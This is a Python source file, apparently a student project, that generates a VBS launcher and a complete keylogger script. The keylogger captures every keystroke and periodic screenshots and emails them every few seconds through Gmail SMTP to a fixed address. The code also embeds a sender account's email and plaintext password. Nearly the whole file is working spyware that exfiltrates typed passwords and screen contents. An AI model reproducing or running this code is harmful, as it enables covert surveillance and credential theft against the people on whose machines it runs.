import auto_py_to_exe
import PyInstaller
def create_vbs():
    f = open(r'E:\Education\4.2\keylogger_making\ts\open2.vbs', 'wb')

    message = """
    Set WshShell = WScript.CreateObject("WScript.Shell")

    exeName = 'E:\Education\4.2\keylogger_making\ts\sample.py'

    statusCode = WshShell.Run (exeName, 1, true)
    """

    f.write(str.encode(message))
    f.close()

def create_python():
    f = open(r'E:\Education\4.2\keylogger_making\ts\sample.py', 'wb')

    message = """
import os  # for making directories to save screensort ,then send screensorts and delete the directories
import keyboard  # for keylogs
import pyautogui, time
import imghdr
from email.message import EmailMessage
import smtplib  # for sending email using SMTP protocol (gmail)
# Semaphore is for blocking the current thread
# Timer is to make a method runs after an `interval` amount of time
from threading import Semaphore, Timer



send_report_every = 5  # 2 seconds
sender_address = 'shawonlodh2508@gmail.com'
sender_pass = 'shawon1996'
receiver_address = '160104064@aust.edu'


class Keylogger:
    def __init__(self, interval):
        # we gonna pass SEND_REPORT_EVERY to interval
        self.interval = interval
        # this is the string variable that contains the log of all
        # the keystrokes within `self.interval`
        self.log = ""
        # for blocking after setting the on_release listener
        self.semaphore = Semaphore(0)

    def callback(self, event):
        name = event.name
        if len(name) > 1:
            # not a character, special key (e.g ctrl, alt, etc.)
            # uppercase with []
            if name == "space":
                # " " instead of "space"
                name = " "
            elif name == "enter":
                # add a new line whenever an ENTER is pressed
                name = "[ENTER]\n"
            elif name == "decimal":
                name = "."
            else:
                # replace spaces with underscores
                name = name.replace(" ", "_")
                name = f"[{name.upper()}]"

        self.log += name

    def sendmail(self, email_sender, pass_sender, email_receiver, message_content):
        # ready the full messege
        msg = EmailMessage()
        msg['Subject'] = 'Text keystroke'
        msg['From'] = email_sender
        msg['To'] = email_receiver
        msg.set_content(message_content)

        # Create SMTP session for sending the mail
        session = smtplib.SMTP('smtp.gmail.com', 587)  # use gmail with port
        session.starttls()  # enable security
        session.login(email_sender, pass_sender)  # login with mail_id and password
        text = msg.as_string()
        session.sendmail(email_sender, email_receiver, text)
        session.quit()
        print('Mail Sent')

    def send_screensort_by_mail(self, email_sender, pass_sender, email_receiver, image_address):
        # ready the full messege with image
        with open(image_address, 'rb') as f:
            file_data = f.read()
            file_type = imghdr.what(f.name)
            file_name = f.name
            # print(file_type)

        msg = EmailMessage()
        msg['Subject'] = 'screensort : Present condition of user pc'
        msg['From'] = email_sender
        msg['To'] = email_receiver
        msg.set_content('one image attached ...')
        msg.add_attachment(file_data, maintype='image', subtype=file_type, filename=file_name)

        # Create SMTP session for sending the mail
        session = smtplib.SMTP('smtp.gmail.com', 587)  # use gmail with port
        session.starttls()  # enable security
        session.login(email_sender, pass_sender)  # login with mail_id and password
        text = msg.as_string()
        session.sendmail(email_sender, email_receiver, text)
        session.quit()
        print('Mail Sent')

    def take_screensort(self):
        path = r"E:\Education\4.2\keylogger_making\test"
        try:
            os.mkdir(path)
        except OSError:
            # print("Creation of the directory %s failed" % path)
            pass
        screenshot = pyautogui.screenshot()
        image_address = path + r'\screenshot1.png'
        screenshot.save(image_address)

        return path, image_address

    def report(self):
        if self.log:
            # if there is something in log, report it
            self.sendmail(sender_address,sender_pass,receiver_address, self.log)
            # can print to a file, whatever you want
            # print(self.log)
        self.log = ""
        '''
        now this is try to send screensort from user's pc
        '''
        path, image_address = self.take_screensort()
        self.send_screensort_by_mail(sender_address, sender_pass, receiver_address, image_address)

        try:
            os.rmdir(path)
        except OSError:
            # print("Creation of the directory %s failed" % path)
            pass

        Timer(interval=self.interval, function=self.report).start()

    def start(self):
        # start the keylogger
        keyboard.on_release(callback=self.callback)
        # start reporting the keylogs
        self.report()
        # block the current thread,
        # since on_release() doesn't block the current thread
        # if we don't block it, when we execute the program, nothing will happen
        # that is because on_release() will start the listener in a separate thread
        self.semaphore.acquire()


if __name__ == "__main__":
    keylogger = Keylogger(interval=send_report_every)
    keylogger.start()
    """
    f.write(str.encode(message))
    f.close()

create_vbs()
create_python()